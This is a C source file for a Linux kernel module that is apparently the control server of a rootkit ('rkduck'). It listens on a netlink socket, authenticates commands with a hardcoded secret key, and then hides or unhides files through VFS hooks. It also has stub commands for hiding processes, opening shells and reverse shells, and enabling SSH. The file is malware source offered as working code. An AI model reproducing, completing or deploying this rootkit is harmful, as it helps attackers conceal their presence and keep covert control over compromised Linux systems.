#include "crumbs_serv.h"

int auth = 0;
my_work_t *work_crumbs_start;
struct sock *nl_sk = NULL;
static struct workqueue_struct *wq;

void exec_cmd(struct cmd_t *cmd)
{
    char proc_path[1024];
    int res;

    if (cmd->id == AUTHENTICATION) {
        dbg("%s\n", cmd->arg);
        if (!strcmp(cmd->arg, CRUMBS_SECRET_KEY)) {
            dbg("rkduck: Authentication %s\n", cmd->arg);
            auth = 1;
        }
    } else if(auth == 1) {
        switch(cmd->id)
        {
            case HIDE_FILE:
                vfs_hide_file(str_remove_duplicates(cmd->arg));
                break;
            case UNHIDE_FILE:
                vfs_unhide_file(str_remove_duplicates(cmd->arg));
                break;
            case HIDE_PROCESS:
                // kstrtoul(cmd->arg, 10, &res);
                // dbg("PID: %d\n", res);
                break;
            case UNHIDE_PROCESS:
                break;
            case MODE_SHELL:
                break;
            case MODE_REVERSE_SHELL:
                break;
            case ACTIVATE_SSH:
                break;
            case DEACTIVATE_SSH:
                break;
        }  

        auth = 0;  
    }

    kfree(cmd->arg);
}

void parse_cmd(char *user_cmd, struct cmd_t *cmd)
{
    char *arg;
    char *endptr;
    int offset;
    int id;
    int length;

    arg = strstr(user_cmd, ":");

    if(arg == NULL) {
        /* TO DO: printk */
    }
    else {
        offset = arg-user_cmd;
        *(user_cmd+offset) = 0;
        id = simple_strtol(user_cmd, &endptr, 10);

        if (endptr == NULL) {
            /* TO DO: printk */
        }
        else {
            cmd->id = id;
            arg++;
            length = strlen(arg)+1;

            if (length > PATH_MAX)
                length = PATH_MAX;

            user_cmd = kmalloc(sizeof(char) * length, GFP_KERNEL);
            memset(user_cmd, 0, length);
            memcpy(user_cmd, arg, length);
            cmd->arg = user_cmd;
            exec_cmd(cmd);
        }
    }
}

static void crumbs_nl_recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlh;
    int pid;
    struct sk_buff *skb_out;
    int msg_size;
    char *msg = "1";
    int res;
    struct cmd_t cmd;

    dbg(KERN_INFO "Entering: %s\n", __FUNCTION__);

    msg_size = strlen(msg);

    nlh = (struct nlmsghdr *)skb->data;
    dbg(KERN_INFO "Netlink received msg payload: %s\n", (char *)nlmsg_data(nlh));
    pid = nlh->nlmsg_pid; /*pid of sending process */

    skb_out = nlmsg_new(msg_size, 0);

    if (!skb_out)
    {
        dbg(KERN_ERR "Failed to allocate new skb\n");
    } else {
        parse_cmd(nlmsg_data(nlh), &cmd);

        nlh = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);
        NETLINK_CB(skb_out).dst_group = 0; /* not in mcast group */
        // strncpy(nlmsg_data(nlh), msg, msg_size);
        strncpy(nlmsg_data(nlh), msg, msg_size);


        dbg("Crumbs server: %s\n", msg);

        res = nlmsg_unicast(nl_sk, skb_out, pid);

        if (res < 0)
            dbg(KERN_INFO "Error while sending back to user\n");
    }
}

static void wq_crumbs_server(struct work_struct *work_arg)
{
    struct work_cont *c_ptr = container_of(work_arg, my_work_t, my_work);
    struct netlink_kernel_cfg cfg = {
       .groups = 1,
       .input = crumbs_nl_recv_msg,
    };

    dbg("Crumbs server: deferred work PID %d \n", current->pid);

    dbg("Entering: %s\n", __FUNCTION__);
    nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, &cfg);

    //nl_sk = netlink_kernel_create(&init_net, NETLINK_USER, 0, hello_nl_recv_msg, NULL, THIS_MODULE);
    if (!nl_sk)
    {
        dbg(KERN_ALERT "Error creating socket.\n");
    } else {
        dbg("Crumbs server: \n");
        kfree(c_ptr);        
    }
}

void crumbs_serv_init(void)
{
    int ret;
    char *msg = "A scent of crumbs fills the air.\n";
    int len = strlen(msg);

    auth = 0;
    wq = create_workqueue("crumbs_queue");
    work_crumbs_start = (my_work_t *) kmalloc(sizeof(my_work_t), GFP_KERNEL);
    
    if (work_crumbs_start) {
        INIT_WORK((struct work_struct *)work_crumbs_start, wq_crumbs_server);
        work_crumbs_start->size = len;
        work_crumbs_start->dt = kmalloc(len+1, GFP_KERNEL);
        strncpy(work_crumbs_start->dt , msg, len);
        ret = queue_work(wq, (struct work_struct *)work_crumbs_start);
    }

    dbg("Crumbs server: started\n");
}

void crumbs_serv_release(void)
{
    flush_workqueue(wq);
    destroy_workqueue(wq);

    netlink_kernel_release(nl_sk);
    dbg("The scent vanished.\n");
}
